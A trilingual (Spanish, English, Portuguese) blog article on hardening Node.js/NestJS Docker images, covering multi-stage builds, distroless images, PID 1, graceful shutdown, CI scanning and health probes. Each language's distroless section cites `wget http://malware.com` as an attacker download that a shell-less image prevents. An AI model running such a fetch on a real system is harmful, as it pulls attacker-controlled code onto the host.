### ESPAÑOL (ES)

Docker ha democratizado los despliegues, pero la brecha entre un `Dockerfile` que "funciona" y uno listo para producción en un banco o una startup de alto crecimiento es abismal. La mayoría de los tutoriales enseñan a copiar `node_modules` y ejecutar `npm start`. En producción, esto es una receta para vulnerabilidades de seguridad, imágenes de 1GB y tiempos de arranque lentos.

En este artículo para ingenieros senior, deconstruiremos el arte de crear contenedores Node.js/NestJS inmutables, seguros y performantes.

#### 1. Multi-Stage Builds: El Estándar de Oro

![Docker Multi-Stage Build](./images/docker-production/build-stages.png)

El objetivo es separar el entorno de construcción (que necesita compiladores, Python, `devDependencies`) del entorno de ejecución (que solo necesita el runtime de Node.js).

```dockerfile
# ------------------------------------------------------------------------------
# Stage 1: Builder
# Usamos una imagen completa para compilar (python, build-essentials, etc)
# ------------------------------------------------------------------------------
FROM node:20-bookworm AS builder

WORKDIR /usr/src/app

COPY package*.json ./

# 'npm ci' es más rápido y estricto que 'npm install'
RUN npm ci

COPY . .

# Compilar TypeScript a JavaScript (dist/)
RUN npm run build

# Poda de dependencias: Solo dejar 'dependencies', borrar 'devDependencies'
RUN npm prune --production

# ------------------------------------------------------------------------------
# Stage 2: Runner
# Imagen minimalista para producción
# ------------------------------------------------------------------------------
FROM gcr.io/distroless/nodejs20-debian12 AS runner

WORKDIR /usr/src/app

# Copiar solo lo necesario desde el Stage 1
COPY --from=builder /usr/src/app/dist ./dist
COPY --from=builder /usr/src/app/node_modules ./node_modules
COPY --from=builder /usr/src/app/package.json ./package.json

# Seguridad: Ejecutar como usuario no-root (distroless usa uid 65532)
USER nonroot:nonroot

CMD ["dist/main.js"]
```

#### 2. Distroless vs Alpine: El Debate de Seguridad

Durante años, **Alpine Linux** fue el rey por su tamaño pequeño (5MB). Sin embargo, Alpine usa `musl libc` en lugar de `glibc`, lo que puede causar problemas de rendimiento o compatibilidad con ciertas librerías de Node.js (como gRPC o librerías de criptografía).

**Distroless** (de Google) es la recomendación moderna:

- **Sin Shell**: No hay `/bin/sh` ni `/bin/bash`. Si alguien logra un RCE (Remote Code Execution), no puede hacer `wget http://malware.com`.
- **Sin Gestor de Paquetes**: No hay `apt` ni `apk`. Inmutable por diseño.
- **Basado en Debian**: Usa `glibc` estándar, garantizando compatibilidad 100%.

#### 3. El Problema del PID 1 y los Procesos Zombis

En Linux, el proceso con PID 1 tiene responsabilidades especiales: debe adoptar procesos huérfanos y manejar señales del sistema. Node.js no está diseñado para ser PID 1.
Si ejecutas `CMD ["node", "main.js"]`, Node será PID 1.

**Consecuencia**: Al matar el contenedor, Node puede no recibir `SIGTERM`, obligando a Docker a usar `SIGKILL` (apagado forzado), interrumpiendo transacciones de base de datos o requests HTTP en vuelo.

**Solución**:
Si usas Distroless, Node.js se ejecuta directamente. En imágenes estándar (Debian/Alpine), utiliza **Tini** (`--init` flag en docker run) o `dumb-init`.
Distroless NodeJS ya maneja esto correctamente envolviendo el runtime.

#### 4. Graceful Shutdown (Apagado Elegante)

Kubernetes es brutal. Cuando escala hacia abajo, envía `SIGTERM` y espera (por defecto 30s) antes de enviar `SIGKILL`. Tu aplicación debe aprovechar ese tiempo para:

1.  Dejar de aceptar nuevas conexiones HTTP.
2.  Esperar a que terminen las peticiones activas.
3.  Cerrar conexiones a DB y Redis.

```typescript
// main.ts
import { NestFactory } from "@nestjs/core";
import { AppModule } from "./app.module";

async function bootstrap() {
  const app = await NestFactory.create(AppModule);

  // Activa los hooks de ciclo de vida de NestJS
  // Esto escucha SIGTERM y llama a onModuleDestroy() en tus servicios
  app.enableShutdownHooks();

  const server = await app.listen(3000);

  // Configuración avanzada de Keep-Alive para evitar errores 502 en Load Balancers
  server.keepAliveTimeout = 65000; // Mayor que el timeout del ALB (60s)
  server.headersTimeout = 66000;
}
bootstrap();
```

#### 5. Escaneo de Vulnerabilidades en CI

No confíes en que tu imagen base es segura hoy y lo será mañana. Nuevas CVEs se descubren a diario.
Integra **Trivy** o **Snyk** en tu pipeline de CI/CD.

```yaml
# .github/workflows/security.yaml
- name: Run Trivy vulnerability scanner
  uses: aquasecurity/trivy-action@master
  with:
    image-ref: "mi-empresa/mi-api:latest"
    format: "table"
    exit-code: "1" # Fallar el build si hay vulnerabilidades críticas
    ignore-unfixed: true
    vuln-type: "os,library"
    severity: "CRITICAL,HIGH"
```

#### 6. Health Checks: Liveness vs Readiness

Docker tiene la instrucción `HEALTHCHECK`, pero en Kubernetes, definimos esto en el YAML del pod.
Diferencia crítica:

- **Liveness Probe**: "¿Estoy vivo?". Si falla, K8s reinicia el pod. (Endpoint: `/health/liveness`). Solo verifica que el proceso Node responde.
- **Readiness Probe**: "¿Puedo recibir tráfico?". Si falla, K8s saca el pod del Load Balancer. (Endpoint: `/health/readiness`). Verifica conexión a DB, Redis, etc.

Usa `@nestjs/terminus` para implementar estos endpoints robustamente.

---

### ENGLISH (EN)

Docker has democratized deployments, but the gap between a `Dockerfile` that "works" and one ready for production in a bank or high-growth startup is abysmal. Most tutorials teach you to copy `node_modules` and run `npm start`. In production, this is a recipe for security vulnerabilities, 1GB images, and slow boot times.

In this article for senior engineers, we will deconstruct the art of creating immutable, secure, and performant Node.js/NestJS containers.

#### 1. Multi-Stage Builds: The Gold Standard

![Docker Multi-Stage Build](./images/docker-production/build-stages.png)

The goal is to separate the build environment (which needs compilers, Python, `devDependencies`) from the runtime environment (which only needs the Node.js runtime).

```dockerfile
# ------------------------------------------------------------------------------
# Stage 1: Builder
# We use a full image for building (python, build-essentials, etc)
# ------------------------------------------------------------------------------
FROM node:20-bookworm AS builder

WORKDIR /usr/src/app

COPY package*.json ./

# 'npm ci' is faster and stricter than 'npm install'
RUN npm ci

COPY . .

# Compile TypeScript to JavaScript (dist/)
RUN npm run build

# Dependency Pruning: Only keep 'dependencies', remove 'devDependencies'
RUN npm prune --production

# ------------------------------------------------------------------------------
# Stage 2: Runner
# Minimalist image for production
# ------------------------------------------------------------------------------
FROM gcr.io/distroless/nodejs20-debian12 AS runner

WORKDIR /usr/src/app

# Copy only what is necessary from Stage 1
COPY --from=builder /usr/src/app/dist ./dist
COPY --from=builder /usr/src/app/node_modules ./node_modules
COPY --from=builder /usr/src/app/package.json ./package.json

# Security: Run as non-root user (distroless uses uid 65532)
USER nonroot:nonroot

CMD ["dist/main.js"]
```

#### 2. Distroless vs. Alpine: The Security Debate

For years, **Alpine Linux** was king due to its small size (5MB). However, Alpine uses `musl libc` instead of `glibc`, which can cause performance or compatibility issues with certain Node.js libraries (like gRPC or crypto libs).

**Distroless** (from Google) is the modern recommendation:

- **No Shell**: No `/bin/sh` or `/bin/bash`. If someone achieves RCE (Remote Code Execution), they cannot `wget http://malware.com`.
- **No Package Manager**: No `apt` or `apk`. Immutable by design.
- **Debian Based**: Uses standard `glibc`, guaranteeing 100% compatibility.

#### 3. The PID 1 Problem and Zombie Processes

In Linux, the PID 1 process has special responsibilities: it must adopt orphaned processes and handle system signals. Node.js is not designed to be PID 1.
If you run `CMD ["node", "main.js"]`, Node will be PID 1.

**Consequence**: When killing the container, Node might not receive `SIGTERM`, forcing Docker to use `SIGKILL` (forced shutdown), interrupting database transactions or in-flight HTTP requests.

**Solution**:
If using Distroless, Node.js is run directly. In standard images (Debian/Alpine), use **Tini** (`--init` flag in docker run) or `dumb-init`.
Distroless NodeJS already handles this correctly by wrapping the runtime.

#### 4. Graceful Shutdown

Kubernetes is brutal. When scaling down, it sends `SIGTERM` and waits (default 30s) before sending `SIGKILL`. Your app must use that time to:

1.  Stop accepting new HTTP connections.
2.  Wait for active requests to finish.
3.  Close DB and Redis connections.

```typescript
// main.ts
import { NestFactory } from "@nestjs/core";
import { AppModule } from "./app.module";

async function bootstrap() {
  const app = await NestFactory.create(AppModule);

  // Enable NestJS lifecycle hooks
  // This listens for SIGTERM and calls onModuleDestroy() in your services
  app.enableShutdownHooks();

  const server = await app.listen(3000);

  // Advanced Keep-Alive config to avoid 502 errors in Load Balancers
  server.keepAliveTimeout = 65000; // Higher than ALB timeout (60s)
  server.headersTimeout = 66000;
}
bootstrap();
```

#### 5. Vulnerability Scanning in CI

Don't trust that your base image is secure today and will remain so tomorrow. New CVEs are discovered daily.
Integrate **Trivy** or **Snyk** into your CI/CD pipeline.

```yaml
# .github/workflows/security.yaml
- name: Run Trivy vulnerability scanner
  uses: aquasecurity/trivy-action@master
  with:
    image-ref: "my-company/my-api:latest"
    format: "table"
    exit-code: "1" # Fail build if critical vulnerabilities found
    ignore-unfixed: true
    vuln-type: "os,library"
    severity: "CRITICAL,HIGH"
```

#### 6. Health Checks: Liveness vs. Readiness

Docker has the `HEALTHCHECK` instruction, but in Kubernetes, we define this in the pod YAML.
Critical difference:

- **Liveness Probe**: "Am I alive?". If it fails, K8s restarts the pod. (Endpoint: `/health/liveness`). Only checks that the Node process responds.
- **Readiness Probe**: "Can I receive traffic?". If it fails, K8s removes the pod from the Load Balancer. (Endpoint: `/health/readiness`). Checks connection to DB, Redis, etc.

Use `@nestjs/terminus` to implement these endpoints robustly.

---

### PORTUGUÊS (PT)

O Docker democratizou as implantações, mas a lacuna entre um `Dockerfile` que "funciona" e um pronto para produção em um banco ou startup de alto crescimento é abismal. A maioria dos tutoriais ensina a copiar `node_modules` e executar `npm start`. Em produção, isso é uma receita para vulnerabilidades de segurança, imagens de 1GB e tempos de inicialização lentos.

Neste artigo para engenheiros seniores, desconstruiremos a arte de criar contêineres Node.js/NestJS imutáveis, seguros e performáticos.

#### 1. Multi-Stage Builds: O Padrão Ouro

![Docker Multi-Stage Build](./images/docker-production/build-stages.png)

O objetivo é separar o ambiente de construção (que precisa de compiladores, Python, `devDependencies`) do ambiente de execução (que só precisa do runtime do Node.js).

```dockerfile
# ------------------------------------------------------------------------------
# Stage 1: Builder
# Usamos uma imagem completa para compilar (python, build-essentials, etc)
# ------------------------------------------------------------------------------
FROM node:20-bookworm AS builder

WORKDIR /usr/src/app

COPY package*.json ./

# 'npm ci' é mais rápido e estrito que 'npm install'
RUN npm ci

COPY . .

# Compilar TypeScript para JavaScript (dist/)
RUN npm run build

# Poda de dependências: Manter apenas 'dependencies', remover 'devDependencies'
RUN npm prune --production

# ------------------------------------------------------------------------------
# Stage 2: Runner
# Imagem minimalista para produção
# ------------------------------------------------------------------------------
FROM gcr.io/distroless/nodejs20-debian12 AS runner

WORKDIR /usr/src/app

# Copiar apenas o necessário do Stage 1
COPY --from=builder /usr/src/app/dist ./dist
COPY --from=builder /usr/src/app/node_modules ./node_modules
COPY --from=builder /usr/src/app/package.json ./package.json

# Segurança: Executar como usuário não-root (distroless usa uid 65532)
USER nonroot:nonroot

CMD ["dist/main.js"]
```

#### 2. Distroless vs Alpine: O Debate de Segurança

Por anos, o **Alpine Linux** foi rei devido ao seu tamanho pequeno (5MB). No entanto, o Alpine usa `musl libc` em vez de `glibc`, o que pode causar problemas de desempenho ou compatibilidade com certas bibliotecas Node.js (como gRPC ou libs de criptografia).

**Distroless** (do Google) é a recomendação moderna:

- **Sem Shell**: Não há `/bin/sh` nem `/bin/bash`. Se alguém conseguir um RCE (Execução Remota de Código), não poderá fazer `wget http://malware.com`.
- **Sem Gerenciador de Pacotes**: Não há `apt` nem `apk`. Imutável por design.
- **Baseado em Debian**: Usa `glibc` padrão, garantindo 100% de compatibilidade.

#### 3. O Problema do PID 1 e Processos Zumbis

No Linux, o processo com PID 1 tem responsabilidades especiais: deve adotar processos órfãos e lidar com sinais do sistema. O Node.js não foi projetado para ser PID 1.
Se você executar `CMD ["node", "main.js"]`, o Node será PID 1.

**Consequência**: Ao matar o contêiner, o Node pode não receber `SIGTERM`, forçando o Docker a usar `SIGKILL` (desligamento forçado), interrompendo transações de banco de dados ou solicitações HTTP em voo.

**Solução**:
Se estiver usando Distroless, o Node.js é executado diretamente. Em imagens padrão (Debian/Alpine), use **Tini** (flag `--init` no docker run) ou `dumb-init`.
O Distroless NodeJS já lida com isso corretamente encapsulando o runtime.

#### 4. Graceful Shutdown (Desligamento Gracioso)

O Kubernetes é brutal. Ao reduzir a escala, ele envia `SIGTERM` e aguarda (padrão 30s) antes de enviar `SIGKILL`. Seu aplicativo deve usar esse tempo para:

1.  Parar de aceitar novas conexões HTTP.
2.  Aguardar o término das solicitações ativas.
3.  Fechar conexões de DB e Redis.

```typescript
// main.ts
import { NestFactory } from "@nestjs/core";
import { AppModule } from "./app.module";

async function bootstrap() {
  const app = await NestFactory.create(AppModule);

  // Habilitar hooks de ciclo de vida do NestJS
  // Isso escuta SIGTERM e chama onModuleDestroy() nos seus serviços
  app.enableShutdownHooks();

  const server = await app.listen(3000);

  // Configuração avançada de Keep-Alive para evitar erros 502 em Load Balancers
  server.keepAliveTimeout = 65000; // Maior que o timeout do ALB (60s)
  server.headersTimeout = 66000;
}
bootstrap();
```

#### 5. Escaneamento de Vulnerabilidades em CI

Não confie que sua imagem base é segura hoje e permanecerá assim amanhã. Novas CVEs são descobertas diariamente.
Integre **Trivy** ou **Snyk** no seu pipeline de CI/CD.

```yaml
# .github/workflows/security.yaml
- name: Run Trivy vulnerability scanner
  uses: aquasecurity/trivy-action@master
  with:
    image-ref: "minha-empresa/minha-api:latest"
    format: "table"
    exit-code: "1" # Falhar o build se houver vulnerabilidades críticas
    ignore-unfixed: true
    vuln-type: "os,library"
    severity: "CRITICAL,HIGH"
```

#### 6. Health Checks: Liveness vs Readiness

O Docker tem a instrução `HEALTHCHECK`, mas no Kubernetes, definimos isso no YAML do pod.
Diferença crítica:

- **Liveness Probe**: "Estou vivo?". Se falhar, o K8s reinicia o pod. (Endpoint: `/health/liveness`). Verifica apenas se o processo Node responde.
- **Readiness Probe**: "Posso receber tráfego?". Se falhar, o K8s remove o pod do Load Balancer. (Endpoint: `/health/readiness`). Verifica conexão com DB, Redis, etc.

Use `@nestjs/terminus` para implementar esses endpoints de forma robusta.
